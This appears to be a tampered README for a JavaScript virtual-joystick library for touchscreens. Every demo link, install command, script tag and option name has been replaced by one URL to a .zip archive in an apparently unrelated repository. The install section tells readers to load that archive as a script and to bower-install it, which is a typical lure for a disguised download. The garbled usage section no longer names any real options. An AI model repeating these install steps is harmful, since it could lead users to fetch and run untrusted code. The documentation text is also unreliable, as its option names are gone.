https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip
==================

It is small library to emulate a virtual joystick for touchscreen.
For details, see ["Let’s Make a 3D Game: Virtual Joystick"](https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip)
post on 
["learningthreejs blog"](https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip).

Show Don't Tell
===============
* [https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip](https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip)
\[[view source](https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip)\] :
It shows a basic usage of the library.
* [https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip](https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip)
\[[view source](https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip)\] :
It shows how to have multiple virtual joystick on the same page
* [https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip](https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip)
\[[view source](https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip)\] :
It shows how to have a stationary base. by [@erichlof](https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip)
* [https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip](https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip)
\[[view source](https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip)\] :
It shows how to limit the distance that the stick can travel from its base. by [@erichlof](https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip)
* [https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip](https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip)
\[[view source](https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip)\] :
Limited Stick (same as above), but with Stationary Base. by [@erichlof](https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip)

How To Install It
=================

You can install it manually. Just do 

```html
<script src='https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip'></script>
```

You can install with [bower](https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip).

```bash
bower install https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip
```

then you add that in your html

```html
<script src="https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip"></script>
```


How To Use It ?
===============

* ```https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip``` is the
[dom element](https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip)
on which we display joystick
* ```https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip``` is the
[dom element](https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip)
which is display for the *stick* of the joystick.
* ```https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip``` is the 
[dom element](https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip)
which is display for its *base*.
* Both elements are optional with sensible default
* you may set ```https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip``` to true during debug.
* you may set ```https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip``` to true for a permanent Stationary joystick base.
* if you do use a stationary base, you must also set ```https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip``` to the desired X-coordinate on the webpage and ```https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip``` to the desired Y-coordinate.  The joystick base will now be fixed at this location.
* you may set ```https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip``` to true in order to limit the distance that the stick can travel from its base.  This will create an invisible circle barrier that the stick cannot leave. 
* if you do use ```https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip``` , you can also set ```https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip``` to the desired radius (in pixels).  The stick will now be confined to stickRadius.  If you do not set ```https://raw.githubusercontent.com/JohnInWI/virtualjoystick.js/master/examples/js-virtualjoystick-2.6.zip``` , it will default to 100 pixels radius.
